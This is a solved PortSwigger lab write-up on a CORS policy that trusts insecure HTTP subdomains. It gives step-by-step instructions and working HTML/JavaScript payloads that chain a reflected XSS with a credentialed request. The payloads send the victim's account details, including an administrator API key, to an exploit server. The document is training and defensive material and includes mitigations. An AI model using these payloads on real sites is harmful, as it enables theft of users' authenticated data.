# 📘 PortSwigger Lab: CORS vulnerability with trusted insecure protocols (Breaking HTTPS)

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-breaking-https-attack
> 🎯 Topic: Cross-Origin Resource Sharing (CORS) — Trusted insecure protocols
> 🧪 Difficulty: Practitioner
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 The Vulnerable Headers](#headers)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Locate the Target Endpoint](#step1)
- [🔍 Step 2 — Test HTTP Origin Reflection](#step2)
- [🔍 Step 3 — Find XSS on the HTTP Subdomain](#step3)
- [🔍 Step 4 — Construct and Deliver the Exploit](#step4)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a misconfigured CORS policy that trusts a trusted subdomain via plain HTTP to:

```text
1. Identify a trusted subdomain that operates over plain HTTP.
2. Find a Cross-Site Scripting (XSS) vulnerability on this insecure subdomain.
3. Craft a JavaScript payload that uses CORS to make an authenticated request to the main HTTPS application (`/accountDetails`).
4. Force the administrator's browser (the victim) to execute the payload.
5. Exfiltrate the administrator's API key to the exploit server.
```

<a id="theory"></a>

## 🧠 Short Theory
Standard SOP prevents scripts on one origin from accessing data on another. CORS can relax this, but security relies on trust. A major flaw occurs when a secure application (HTTPS) trusts a subdomain that uses insecure HTTP. An attacker performing a Man-in-the-Middle (MitM) attack can inject a malicious script into the insecure HTTP traffic. Modern browsers will consider this script as running on the trusted origin.

This lab simulates this. Although we don't perform a MitM, we are given a trusted HTTP subdomain with an XSS vulnerability, which achieves the same goal: running arbitrary JavaScript on a trusted origin.

<a id="idea"></a>

## 🧩 Core Idea
The secure main application (`https://YOUR-LAB-ID.web-security-academy.net`) dynamically whitelists and trusts any of its subdomains, regardless of protocol (HTTPS vs. HTTP). The `stock` subdomain (`http://stock.YOUR-LAB-ID...`) uses HTTP and is vulnerable to reflected XSS. We use this XSS as a launchpad.

```text
Secure App:         Trusts http://stock... and allows credentials.
Insecure Subdomain: Is vulnerable to XSS.
Victim's browser:   Navigates to the XSS URL on the HTTP subdomain.
XSS script:         Executes an authenticated AJAX request to the main HTTPS application using cookies.
Secure App:         Sees Origin: http://stock..., matches the flawed whitelist, and reflects ACAO with credentials.
XSS script:         Reads the response and exfiltrates the API key ✅
```

<a id="headers"></a>

## 📡 The Vulnerable Headers
Testing the `/accountDetails` endpoint with a spoofed `Origin` header in Burp Repeater confirms the vulnerability:

```http
Origin: http://subdomain.0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net
```
The server responds with:
```http
Access-Control-Allow-Origin: http://subdomain.0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net
Access-Control-Allow-Credentials: true
```
This confirms that the secure (HTTPS) application explicitly permits cross-origin requests from an insecure (HTTP) subdomain while accepting session cookies.

<a id="exploit"></a>

## ⚡ The Exploit Payload
We create an HTML wrapper that forces the victim to navigate to the XSS URL on the HTTP subdomain. This URL, in turn, contains the JavaScript "matryoshka" to perform the data theft.

```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bencodeURIComponent(this.responseText);
        };
        req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
        req.withCredentials = true; // (!) CRITICAL: Attach cookies
        req.send();
    %3c/script>&storeId=1"
</script>
```
*Note the URL encoding for the embedded `<script>` tag's closing bracket (`%3c`) and the data exfiltration (`%2b` for the `+`).*

<a id="step1"></a>

## 🔍 Step 1 — Locate the Target Endpoint
Log in as the test user. Navigate to the account page. Identify the AJAX request to `GET /accountDetails`. This request returns the API key. Confirm the response contains `Access-Control-Allow-Credentials: true`.

<a id="step2"></a>

## 🔍 Step 2 — Test HTTP Origin Reflection
Send the `/accountDetails` request to Burp Repeater. Add an `Origin` header using `http` and an arbitrary subdomain: `Origin: http://subdomain.YOUR-LAB-ID...`. Observe that the origin is dynamically reflected in `Access-Control-Allow-Origin`, confirming the flawed trust relationship.

<a id="step3"></a>

## 🔍 Step 3 — Find XSS on the HTTP Subdomain
Navigate to a product page and click "Check stock". Review the Burp History to find the request to the `stock` subdomain (`Host: stock.YOUR-LAB-ID...`) over HTTP. It should be a GET request like `GET /?productId=1&storeId=1`.
Test the `productId` parameter for reflected XSS: `GET /?productId=<test>&storeId=1`. Confirm that `<test>` is reflected in the 400 response.

<a id="step4"></a>

## 🔍 Step 4 — Construct and Deliver the Exploit
Open the Exploit Server. Wrap the standard XHR payload inside a `document.location` redirect within a `<script>` tag. Embed the final XSS payload into the `productId` parameter, ensuring proper encoding. Save the exploit and deliver it to the victim.

Check the Access Log on the exploit server. Look for a request from the victim's IP containing the stolen data: `GET /log?key=%7B%0A%20%20%22username%22...`. Retrieve the administrator's API key.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<script>
    document.location="http://stock.0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8000af04b2aaa8801e0d1800f600dd.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a0e00ba0425aa52800e0c590116009b.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

<a id="response"></a>

## 📥 Example Result
Extracted Log Entry (Access Log)
```text
10.0.4.170      2026-09-27 22:06:49 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22apikey%22:%20%22zus3ACaOMqlntqn8pFzs1ZtYs1vwCeL7%22,...} HTTP/1.1" 200
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Find sensitive data endpoint (/accountDetails) and confirm ACAC: true.
2. Verify dynamic CORS reflection for insecure http://subdomain.
3. Identify XSS vulnerability on an insecure HTTP subdomain (stock).
4. Create an HTML redirect payload to the XSS URL.
5. Embed a CORS JavaScript "matryoshka" inside the XSS payload.
6. Force victim to access the HTML, which redirects to the XSS on http.
7. Victim's browser executes script, sending authenticated XHR to https.
8. Secure application reflects ACAO, and browser allows script to read response.
9. Script exfiltrates stolen API key to exploit server log.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Trusting HTTP Subdomains
The secure application (`https://...`) broke the HTTPS trust boundary by explicitly trusting an insecure origin (`http://stock...`). This created a significant security vulnerability.

2. Chaining CORS with XSS
The attacker chained two vulnerabilities: a flawed CORS policy and a reflected XSS. The XSS on the insecure origin was used as the perfect launchpad for an authenticated cross-origin request to the secure origin.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When evaluating CORS configurations, never assume HTTPS creates a complete secure boundary.

```text
If a secure application (HTTPS) trusts an insecure origin (HTTP, especially from a user-controlled subdomain or third party), this trust relationship is fatally flawed.
If you find XSS on the insecure trusted origin, you can bypass all SOP protection for the secure origin using CORS.
Always test for dynamic reflection of `http` vs. `https`.
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Forgetting `req.withCredentials = true`
Without this flag, the AJAX request will not include the victim's session cookies, and the server will return the public error message instead of the administrator's data.

Mistake 2. Incorrect URL Encoding
This payload is a "matryoshka". It requires URL encoding at different levels: the embedded `<script>` tag's closing bracket (`%3c`) and the data exfiltration concatenation (`%2b`). Incorrect encoding breaks the JavaScript.

<a id="defense"></a>

## 🛡 Mitigation
1. Do Not Trust HTTP
Never whitelist insecure origins (HTTP) in a secure (HTTPS) application's CORS policy.

2. Enforce HTTPS only
Ensure that all subdomains and trusted partners use modern, rigorous HTTPS with HSTS to prevent MitM attacks.

3. Sanitization
Properly sanitize all user-controlled inputs (like `productId`) to prevent XSS vulnerabilities, which are often used as launchpads for other attacks.

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Identified sensitive data endpoint (`/accountDetails`)
- [ ] Confirmed dynamic CORS reflection for an `http` origin
Execution & Verification
- [ ] Found XSS vulnerability on an insecure HTTP subdomain (stock)
- [ ] Crafted a redirect and XSS-CORS "matryoshka" payload
- [ ] URL encoded critical characters (`%3c`, `%2b`)
- [ ] Delivered exploit and retrieved key from logs
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
This lab successfully demonstrated how a secure application's HTTPS boundary can be fatally broken through a flawed CORS configuration that trusts insecure protocols. By leveraging an XSS vulnerability on an insecure trusted subdomain, an attacker can steal sensitive, authenticated data from the main application, effectively rendering its HTTPS protection moot.

[⬆ Back to top](#top)
